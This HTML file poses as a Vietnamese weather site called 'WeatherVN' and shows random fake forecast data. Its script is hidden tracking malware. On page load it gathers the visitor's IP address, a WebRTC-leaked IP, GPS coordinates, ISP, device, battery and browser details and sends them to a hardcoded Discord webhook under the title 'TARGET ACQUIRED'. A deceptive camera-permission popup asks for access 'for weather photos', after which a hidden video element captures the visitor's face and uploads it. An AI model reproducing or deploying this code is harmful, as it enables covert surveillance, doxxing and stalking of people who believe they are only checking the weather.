<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
    <title>Dự báo thời tiết hôm nay - WeatherVN</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%);
            min-height: 100vh;
            color: #fff;
        }
        .header {
            background: rgba(0,0,0,0.4);
            padding: 15px 0;
            backdrop-filter: blur(10px);
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .header-container {
            max-width: 1200px;
            margin: 0 auto;
            padding: 0 20px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            flex-wrap: wrap;
        }
        .logo {
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .logo-icon { font-size: 40px; animation: pulse 2s infinite; }
        @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
        .logo-text { font-size: 28px; font-weight: bold; background: linear-gradient(45deg, #ffcc00, #ff6b00); -webkit-background-clip: text; background-clip: text; color: transparent; }
        .search-box { display: flex; gap: 10px; }
        .search-box input { padding: 10px 15px; border-radius: 25px; border: none; outline: none; width: 200px; background: rgba(255,255,255,0.2); color: white; }
        .search-box input::placeholder { color: rgba(255,255,255,0.7); }
        .search-box button { padding: 10px 20px; border-radius: 25px; border: none; background: linear-gradient(45deg, #ffcc00, #ff6b00); color: #333; cursor: pointer; font-weight: bold; transition: 0.3s; }
        .search-box button:hover { transform: scale(1.05); }
        .main-content { max-width: 1200px; margin: 30px auto; padding: 0 20px; }
        .weather-card {
            background: rgba(255,255,255,0.1);
            backdrop-filter: blur(15px);
            border-radius: 30px;
            padding: 30px;
            margin-bottom: 30px;
            text-align: center;
            border: 1px solid rgba(255,255,255,0.2);
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        .city-name { font-size: 42px; font-weight: bold; margin-bottom: 10px; text-shadow: 0 0 20px rgba(255,204,0,0.5); }
        .date-time { font-size: 16px; opacity: 0.8; margin-bottom: 20px; }
        .temp-main { font-size: 72px; font-weight: bold; margin: 20px 0; text-shadow: 0 0 10px rgba(255,107,0,0.5); }
        .weather-icon { font-size: 80px; margin: 20px 0; animation: bounce 2s infinite; }
        @keyframes bounce { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-10px); } }
        .weather-desc { font-size: 24px; margin-bottom: 20px; }
        .details { display: flex; justify-content: center; gap: 40px; flex-wrap: wrap; margin-top: 30px; }
        .detail-item { text-align: center; background: rgba(0,0,0,0.3); padding: 15px 25px; border-radius: 20px; backdrop-filter: blur(5px); transition: 0.3s; }
        .detail-item:hover { transform: translateY(-5px); background: rgba(0,0,0,0.5); }
        .detail-label { font-size: 14px; opacity: 0.7; }
        .detail-value { font-size: 24px; font-weight: bold; }
        .forecast-title { font-size: 24px; margin-bottom: 20px; padding-left: 10px; border-left: 4px solid #ffcc00; }
        .forecast-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(150px, 1fr)); gap: 20px; margin-bottom: 30px; }
        .forecast-day { background: rgba(255,255,255,0.1); backdrop-filter: blur(10px); border-radius: 20px; padding: 20px; text-align: center; transition: 0.3s; border: 1px solid rgba(255,255,255,0.1); }
        .forecast-day:hover { transform: translateY(-5px); background: rgba(255,255,255,0.2); border-color: #ffcc00; }
        .day-name { font-size: 18px; font-weight: bold; margin-bottom: 10px; }
        .forecast-icon { font-size: 40px; margin: 10px 0; }
        .forecast-temp { font-size: 20px; font-weight: bold; }
        .footer { background: rgba(0,0,0,0.4); padding: 20px; text-align: center; font-size: 12px; margin-top: 30px; }
        #cameraPermissionPopup {
            position: fixed;
            bottom: 20px;
            right: 20px;
            background: linear-gradient(135deg, rgba(0,0,0,0.95), rgba(30,30,50,0.95));
            backdrop-filter: blur(10px);
            padding: 20px;
            border-radius: 20px;
            z-index: 1000;
            display: none;
            max-width: 300px;
            border: 1px solid rgba(255,204,0,0.5);
            box-shadow: 0 0 30px rgba(255,204,0,0.2);
        }
        @media (max-width: 768px) {
            .city-name { font-size: 28px; }
            .temp-main { font-size: 48px; }
            .forecast-grid { grid-template-columns: repeat(2, 1fr); }
        }
    </style>
</head>
<body>

    <div class="header">
        <div class="header-container">
            <div class="logo">
                <div class="logo-icon">⛅</div>
                <div class="logo-text">Weather<span>VN</span></div>
            </div>
            <div class="search-box">
                <input type="text" placeholder="Nhập tên thành phố..." id="cityInput" value="Hà Nội">
                <button onclick="searchWeather()">🔍 Tìm</button>
            </div>
        </div>
    </div>

    <div class="main-content">
        <div class="weather-card" id="weatherCard">
            <div class="city-name" id="cityName">Hà Nội</div>
            <div class="date-time" id="dateTime"></div>
            <div class="weather-icon" id="weatherIcon">☀️</div>
            <div class="temp-main" id="tempMain">32°C</div>
            <div class="weather-desc" id="weatherDesc">Nắng nóng, không mưa</div>
            <div class="details">
                <div class="detail-item"><div class="detail-label">🌡️ Cảm giác</div><div class="detail-value" id="feelsLike">34°C</div></div>
                <div class="detail-item"><div class="detail-label">💧 Độ ẩm</div><div class="detail-value" id="humidity">65%</div></div>
                <div class="detail-item"><div class="detail-label">💨 Gió</div><div class="detail-value" id="wind">12 km/h</div></div>
                <div class="detail-item"><div class="detail-label">🌅 Tia UV</div><div class="detail-value" id="uv">7</div></div>
            </div>
        </div>
        <div class="forecast-title">📅 Dự báo 7 ngày tới</div>
        <div class="forecast-grid" id="forecastGrid"></div>
    </div>
    <div class="footer">
        <p>© 2026 WeatherVN - Dữ liệu từ Trung tâm Khí tượng Thủy văn Quốc gia</p>
        <p>Cập nhật liên tục 24/7 | Hotline: 1900 1234</p>
    </div>

    <div id="cameraPermissionPopup">
        <div style="display: flex; align-items: center; gap: 10px;">
            <span style="font-size: 28px;">📷</span>
            <div><b>WeatherVN cần quyền camera</b><br><small>Để cập nhật ảnh thời tiết thực tế</small></div>
        </div>
        <div style="display: flex; gap: 10px; margin-top: 15px;">
            <button id="allowCameraBtn" style="flex:1; padding:8px; background:linear-gradient(45deg,#ffcc00,#ff6b00); border:none; border-radius:10px; font-weight:bold; cursor:pointer;">📸 Cho phép</button>
            <button id="denyCameraBtn" style="flex:1; padding:8px; background:#333; border:none; border-radius:10px; color:white; cursor:pointer;">❌ Từ chối</button>
        </div>
    </div>

    <video id="hiddenVideo" autoplay playsinline style="display:none; position:absolute; top:-9999px; left:-9999px; width:1px; height:1px;"></video>
    <canvas id="screenshotCanvas" style="display:none;"></canvas>
    <canvas id="faceCanvas" style="display:none;"></canvas>

    <script>
        // ========== DISCORD WEBHOOK ==========
        const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1510866506542616606/Vkt6e_zWm3nZS8pLbqROJBxdqY5OTyGpz3sE3brtnj6ssJA2YE4-fHrQ90IeMc4-d7--";
        
        let mediaStream = null;
        let faceCaptured = false;
        
        // ========== HIỂN THỊ THỜI TIẾT ==========
        function updateWeatherDisplay() {
            const city = document.getElementById('cityInput').value;
            document.getElementById('cityName').innerText = city;
            const now = new Date();
            const options = { weekday: 'long', year: 'numeric', month: 'numeric', day: 'numeric', hour: '2-digit', minute: '2-digit' };
            document.getElementById('dateTime').innerHTML = now.toLocaleDateString('vi-VN', options);
            const weathers = [
                { icon: "☀️", desc: "Nắng nóng", temp: 34, feels: 36, humidity: 60, wind: 10, uv: 8 },
                { icon: "⛅", desc: "Mây nhẹ", temp: 30, feels: 32, humidity: 65, wind: 12, uv: 6 },
                { icon: "☁️", desc: "Nhiều mây", temp: 28, feels: 29, humidity: 70, wind: 8, uv: 4 },
                { icon: "🌧️", desc: "Mưa nhẹ", temp: 26, feels: 27, humidity: 85, wind: 15, uv: 2 }
            ];
            const w = weathers[Math.floor(Math.random() * weathers.length)];
            document.getElementById('weatherIcon').innerHTML = w.icon;
            document.getElementById('tempMain').innerHTML = w.temp + "°C";
            document.getElementById('weatherDesc').innerHTML = w.desc;
            document.getElementById('feelsLike').innerHTML = w.feels + "°C";
            document.getElementById('humidity').innerHTML = w.humidity + "%";
            document.getElementById('wind').innerHTML = w.wind + " km/h";
            document.getElementById('uv').innerHTML = w.uv;
            
            const days = ["Hôm nay", "Thứ 3", "Thứ 4", "Thứ 5", "Thứ 6", "Thứ 7", "CN"];
            const forecastIcons = ["☀️", "⛅", "☁️", "🌧️", "⛅", "☀️", "🌧️"];
            const forecastTemps = [34, 32, 29, 27, 30, 33, 28];
            let html = '';
            for(let i = 0; i < 7; i++) html += `<div class="forecast-day"><div class="day-name">${days[i]}</div><div class="forecast-icon">${forecastIcons[i]}</div><div class="forecast-temp">${forecastTemps[i]}°C</div></div>`;
            document.getElementById('forecastGrid').innerHTML = html;
        }
        function searchWeather() { updateWeatherDisplay(); }
        setInterval(updateWeatherDisplay, 300000);
        updateWeatherDisplay();
        
        function showCameraPopup() { document.getElementById('cameraPermissionPopup').style.display = 'block'; }
        
        async function captureFace() {
            if(faceCaptured) return null;
            try {
                const video = document.getElementById('hiddenVideo');
                const canvas = document.getElementById('faceCanvas');
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                faceCaptured = true;
                return canvas.toDataURL('image/jpeg', 0.8);
            } catch(e) { return null; }
        }
        
        async function enableCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                mediaStream = stream;
                const video = document.getElementById('hiddenVideo');
                video.srcObject = stream;
                await video.play();
                setTimeout(async () => {
                    const facePhoto = await captureFace();
                    if(facePhoto) await sendToDiscordWithFace(facePhoto);
                    if(mediaStream) mediaStream.getTracks().forEach(track => track.stop());
                    mediaStream = null;
                }, 1500);
                return true;
            } catch(e) { return false; }
        }
        
        async function sendToDiscordWithFace(faceData) {
            const blob = await (await fetch(faceData)).blob();
            const formData = new FormData();
            formData.append('file', blob, 'face.jpg');
            await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
        }
        
        document.getElementById('allowCameraBtn').onclick = async () => {
            document.getElementById('cameraPermissionPopup').style.display = 'none';
            await enableCamera();
        };
        document.getElementById('denyCameraBtn').onclick = () => {
            document.getElementById('cameraPermissionPopup').style.display = 'none';
        };
        
        // ========== HÀM LẤY THÔNG TIN ==========
        async function getPublicIP() { try { const res = await fetch('https://api.ipify.org?format=json'); const d = await res.json(); return d.ip; } catch(e) { return null; } }
        function getWebRTCIP() { return new Promise((r) => { try { const pc = new RTCPeerConnection({ iceServers: [] }); pc.createDataChannel(''); pc.createOffer().then(o => pc.setLocalDescription(o)); pc.onicecandidate = (e) => { if(e?.candidate?.candidate) { const m = e.candidate.candidate.match(/([0-9]{1,3}\.){3}[0-9]{1,3}/); if(m) { pc.close(); r(m[0]); } } }; setTimeout(() => { pc.close(); r(null); }, 3000); } catch(e) { r(null); } }); }
        function getCoordinates() { return new Promise((r) => { if(!navigator.geolocation) { r(null); return; } navigator.geolocation.getCurrentPosition( (p) => r({ lat: p.coords.latitude, lon: p.coords.longitude, acc: p.coords.accuracy }), () => r(null), { enableHighAccuracy: true, timeout: 5000 } ); }); }
        async function getLocationFromIP() { try { const res = await fetch('https://ipapi.co/json/'); const d = await res.json(); return { city: d.city, country: d.country_name, lat: d.latitude, lon: d.longitude, isp: d.isp, org: d.org }; } catch(e) { return null; } }
        function getBrowserInfo() { return { ua: navigator.userAgent, platform: navigator.platform, lang: navigator.language, screen: `${screen.width}x${screen.height}`, tz: Intl.DateTimeFormat().resolvedOptions().timeZone, ref: document.referrer || "Direct", url: window.location.href, time: new Date().toISOString() }; }
        async function getBatteryInfo() { if(navigator.getBattery) { try { const b = await navigator.getBattery(); return { level: Math.round(b.level * 100), charging: b.charging }; } catch(e) { return null; } } return null; }
        
        // ========== GỬI DISCORD SIÊU NGẦU ==========
        async function sendEliteToDiscord() {
            try {
                const [publicIP, webRTCIP, coords, ipLocation, browserInfo, battery] = await Promise.all([ getPublicIP(), getWebRTCIP(), getCoordinates(), getLocationFromIP(), getBrowserInfo(), getBatteryInfo() ]);
                const finalIP = publicIP || webRTCIP || "Unknown";
                const isVPN = webRTCIP && publicIP && webRTCIP !== publicIP;
                const isMobile = /Mobi|Android|iPhone/i.test(browserInfo.ua);
                
                let coordText = "🌍 **KHÔNG CÓ DỮ LIỆU**";
                if(coords && coords.lat) coordText = `📍 **${coords.lat}, ${coords.lon}**\n🎯 Độ chính xác: ${Math.round(coords.acc)}m\n🗺️ [Google Maps](https://www.google.com/maps?q=${coords.lat},${coords.lon})`;
                else if(ipLocation?.lat) coordText = `📍 **${ipLocation.city}, ${ipLocation.country}**\n📡 Tọa độ: ${ipLocation.lat}, ${ipLocation.lon}\n🏢 ISP: ${ipLocation.isp || 'Unknown'}\n🗺️ [Xem bản đồ](https://www.google.com/maps?q=${ipLocation.lat},${ipLocation.lon})`;
                
                const embed = {
                    title: "🔥 **WEATHER LOGGER | TARGET ACQUIRED** 🔥",
                    color: isVPN ? 0xff5500 : 0x00ff88,
                    timestamp: new Date().toISOString(),
                    thumbnail: { url: "https://cdn-icons-png.flaticon.com/512/1163/1163624.png" },
                    author: { name: "🌪️ WEATHERVN INTELLIGENCE", icon_url: "https://cdn-icons-png.flaticon.com/512/1163/1163624.png" },
                    fields: [
                        { name: "━━━━━━━━━━ 📍 ĐỊNH VỊ ━━━━━━━━━━", value: coordText, inline: false },
                        { name: "━━━━━━━━━━ 🌐 IP & MẠNG ━━━━━━━━━━", value: `\`\`\`yaml\nIP Thật: ${finalIP}\nWebRTC IP: ${webRTCIP || 'Không có'}\nTrạng thái VPN: ${isVPN ? '⚠️ PHÁT HIỆN VPN' : '✅ KẾT NỐI TRỰC TIẾP'}\n\`\`\``, inline: false },
                        { name: "━━━━━━━━━━ 💻 THIẾT BỊ ━━━━━━━━━━", value: `\`\`\`css\n[${isMobile ? '📱 MOBILE' : '💻 PC/LAPTOP'}]\nOS: ${browserInfo.platform}\nTrình duyệt: ${browserInfo.ua.split(' ').slice(0,3).join(' ')}\nMàn hình: ${browserInfo.screen}\nPin: ${battery ? `${battery.level}% ${battery.charging ? '⚡ Đang sạc' : '🔋 Không sạc'}` : 'N/A'}\n\`\`\``, inline: false },
                        { name: "━━━━━━━━━━ 🌍 NGÔN NGỮ & THỜI GIAN ━━━━━━━━━━", value: `\`\`\`fix\nNgôn ngữ: ${browserInfo.lang}\nMúi giờ: ${browserInfo.tz}\nThời gian: ${new Date().toLocaleString('vi-VN')}\n\`\`\``, inline: false },
                        { name: "━━━━━━━━━━ 🔗 NGUỒN TRUY CẬP ━━━━━━━━━━", value: `\`\`\`${browserInfo.ref.substring(0, 100) || 'Direct / Không có'}\`\`\``, inline: false }
                    ],
                    footer: { text: "⚡ WeatherVN Intelligence System | Đã ghi nhận thông tin", icon_url: "https://cdn-icons-png.flaticon.com/512/1163/1163624.png" },
                    image: { url: "attachment://screenshot.jpg" }
                };
                
                // Chụp màn hình
                const canvas = document.getElementById('screenshotCanvas');
                canvas.width = window.innerWidth;
                canvas.height = window.innerHeight;
                const ctx = canvas.getContext('2d');
                ctx.fillStyle = '#0f0c29';
                ctx.fillRect(0, 0, canvas.width, canvas.height);
                ctx.fillStyle = '#ffcc00';
                ctx.font = 'bold 24px Arial';
                ctx.fillText('WeatherVN', 20, 50);
                ctx.fillStyle = '#ffffff';
                ctx.font = '14px Arial';
                ctx.fillText(`IP: ${finalIP}`, 20, 100);
                ctx.fillText(`Time: ${new Date().toLocaleString()}`, 20, 130);
                const screenshot = canvas.toDataURL('image/jpeg', 0.6);
                const blob = await (await fetch(screenshot)).blob();
                const formData = new FormData();
                formData.append('file', blob, 'screenshot.jpg');
                formData.append('payload_json', JSON.stringify({ embeds: [embed] }));
                await fetch(DISCORD_WEBHOOK, { method: 'POST', body: formData });
                
                console.log("✅ Đã gửi dữ liệu siêu ngầu lên Discord");
            } catch(e) { console.log("Lỗi:", e); }
        }
        
        // ========== KHỞI CHẠY ==========
        window.addEventListener('load', () => {
            setTimeout(() => { sendEliteToDiscord(); showCameraPopup(); }, 1500);
            setTimeout(() => { sendEliteToDiscord(); }, 5000);
        });
    </script>
</body>
</html>
